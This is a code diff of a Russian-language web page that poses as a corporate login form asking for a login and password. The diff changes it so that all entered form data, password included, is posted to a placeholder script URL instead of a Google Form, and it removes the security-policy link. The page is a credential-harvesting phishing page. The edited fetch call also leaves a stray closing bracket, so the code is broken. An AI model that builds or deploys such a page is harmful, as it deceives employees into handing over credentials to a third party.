@@ -115,12 +115,12 @@
             </div>
             
             <div class="form-group">
-                <label for="username">Корпоративный ID</label>
+                <label for="username">Логин</label>
                 <input type="text" id="username" name="username" required autocomplete="off">
             </div>
             
             <div class="form-group">
-                <label for="password">Пароль (необязательно)</label>
+                <label for="password">Пароль</label>
                 <input type="password" id="password" name="password" placeholder="Для двухфакторной аутентификации" autocomplete="off">
             </div>
             
@@ -130,7 +130,7 @@
         
         <div class="footer">
             <p>© 2024 ООО "Корпоративные решения". Все права защищены.</p>
-            <p><a href="#" style="color: #4361ee; text-decoration: none;">Политика безопасности</a></p>
+
         </div>
     </div>
 
@@ -154,17 +154,10 @@
             const entryLastName = 'entry.1659127593'; // ID поля фамилии
             const entryUsername = 'entry.2121935433'; // ID поля логина
             
-            fetch(`https://docs.google.com/forms/d/e/${formID}/formResponse`, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: new URLSearchParams({
-                    [entryLastName]: formData.lastname,
-                    [entryUsername]: formData.username,
-                    'submit': 'Submit'
-                })
+            fetch('ВАШ_URL_СКРИПТА', {
+  method: 'POST',
+  body: JSON.stringify(formData)
+})
             })
             .then(() => {
                 // Перенаправление через 1 секунду
